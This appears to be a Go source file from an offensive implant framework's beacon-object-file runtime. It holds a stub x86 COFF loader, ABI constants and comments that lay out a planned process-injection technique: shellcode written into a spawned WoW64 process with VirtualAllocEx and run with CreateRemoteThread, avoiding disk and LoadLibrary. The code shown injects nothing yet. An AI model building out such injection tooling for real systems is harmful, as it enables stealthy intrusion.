//go:build windows

package bof

import (
	"errors"
)

// ErrCrossArchX86Unsupported is returned when Run or Load is fed a
// 32-bit (i386) COFF object and the implant cannot route it to the
// x86 fork-and-run path.
//
// Slice 1.d phase A (v0.155+) shipped the detection layer + this
// sentinel. Phase B-bis (in progress) replaces the original
// rundll32-with-tempfiles design with a no-disk, no-LoadLibrary
// model: a PIC shellcode blob is embedded under the
// bof_x86_loader build tag, the orchestrator VirtualAllocEx's it
// into a freshly-spawned WoW64 host, CreateRemoteThread targets
// the loader's offset-0 entry with a parameter block address, and
// the parent ReadProcessMemory's the captured output back.
//
// Step 0 (this commit): C shellcode skeleton + embed gate are
// live; the Go orchestrator hand-off lands in step 1. Until then
// the bof_x86_loader-tagged build also surfaces this sentinel —
// the only difference vs the default build is that the shellcode
// bytes are linked in and ready for step 1 to wire up.
var ErrCrossArchX86Unsupported = errors.New("runtime/bof: x86 COFF detected but no x86 fork-and-run orchestrator wired (slice 1.d phase B-bis step 1 — queued)")

// x86 loader ABI — mirror of LOADER_STATUS_* / LOADER_ABI_*
// constants in runtime/bof/internal/x86loader/abi.h. Kept in sync
// by hand; the C header is the source of truth, any rename there
// MUST land here in the same commit. The loaderParams struct
// itself is declared in the orchestrator file once it lands
// (step 1) — these constants are referenced by the embed test
// already so they live in the always-compiled file.
const (
	loaderABIMagic   uint32 = 0x36384342 // 'BC86'
	loaderABIVersion uint32 = 1
)

const (
	loaderStatusPending      uint32 = 0
	loaderStatusRunning      uint32 = 1
	loaderStatusDone         uint32 = 2
	loaderStatusABIMismatch  uint32 = 3
	loaderStatusResolveFail  uint32 = 4
	loaderStatusLoadFail     uint32 = 5
	loaderStatusBOFCrashed   uint32 = 6
)

// coffX86Loader registers under KindCOFFx86. Today it surfaces
// ErrCrossArchX86Unsupported regardless of the bof_x86_loader
// build tag — the shellcode bytes are present under the tag but
// the cross-process orchestrator that consumes them is in
// step 1 (queued).
type coffX86Loader struct{}

func (coffX86Loader) Kind() Kind { return KindCOFFx86 }

func (coffX86Loader) Load(_ []byte) (Runnable, error) {
	// Confirm the shellcode embed slot is honoured for the
	// tagged build — this catches a regression where the embed
	// directive silently drops the bytes (e.g. file rename).
	// The bytes themselves are not yet used because the
	// orchestrator is unwritten.
	if _, err := loadX86LoaderShellcode(); err != nil {
		return nil, err
	}
	return nil, ErrCrossArchX86Unsupported
}

func init() {
	registerLoader(coffX86Loader{})
}
